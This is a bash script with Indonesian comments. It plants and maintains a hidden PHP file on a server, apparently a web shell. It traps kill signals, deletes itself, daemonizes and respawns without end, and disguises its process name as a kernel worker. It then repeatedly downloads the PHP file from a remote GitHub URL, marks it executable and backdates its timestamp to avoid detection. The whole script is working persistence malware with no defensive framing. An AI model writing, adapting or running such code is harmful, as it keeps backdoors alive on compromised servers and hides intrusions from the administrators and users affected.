#!/bin/bash

# Fungsi untuk mengabaikan sinyal kill
ignore_signal() {
    echo "Ignoring signal: $1"
}

# Abaikan sinyal yang umum digunakan untuk menghentikan proses
trap 'ignore_signal SIGTERM' SIGTERM
trap 'ignore_signal SIGINT' SIGINT
trap 'ignore_signal SIGHUP' SIGHUP

# Fungsi untuk menghapus dirinya sendiri setelah dijalankan
self_delete() {
    rm -f "$0" 2>/dev/null
}

# Fungsi untuk menjalankan sebagai daemon (background process)
daemonize() {
    if [ $$ -ne $(bash -c 'echo $PPID') ]; then
        (setsid bash "$0" "$@" &)
        exit
    fi

    setsid
    exec </dev/null >/dev/null 2>/dev/null
}

# Fungsi untuk mengubah nama proses agar terlihat seperti proses sistem
rename_process() {
    echo -ne "\x00[kworker/u16:2]\x00" > /proc/self/comm 2>/dev/null
}

# Fungsi untuk memastikan script selalu hidup (auto-respawn)
respawn() {
    while true; do
        bash "$0" & 
        child_pid=$!
        wait $child_pid
    done
}

# URL sumber file yang akan diunduh
url="https://raw.githubusercontent.com/only1d/exerciseversiond/refs/heads/main/finalcommad.php"
file_name="dxghst.php"
timestamp="201201081531.12"

# Jalankan fungsi penting
self_delete    # Hapus file setelah dijalankan
daemonize      # Jadikan proses daemon (background)
respawn &      # Aktifkan auto-respawn jika terbunuh
rename_process # Rename proses agar lebih tersembunyi

# Loop utama untuk mengunduh & mempertahankan file
while true; do
    curl "$url" -o "$file_name"
    chmod 0755 "$file_name"
    touch -t "$timestamp" "$file_name"  # Menjaga timestamp tetap

    for ((i=0; i<10; i++)); do
        chmod 0755 "$file_name"
        touch -t "$timestamp" "$file_name"
        sleep 1
    done

    sleep 5
done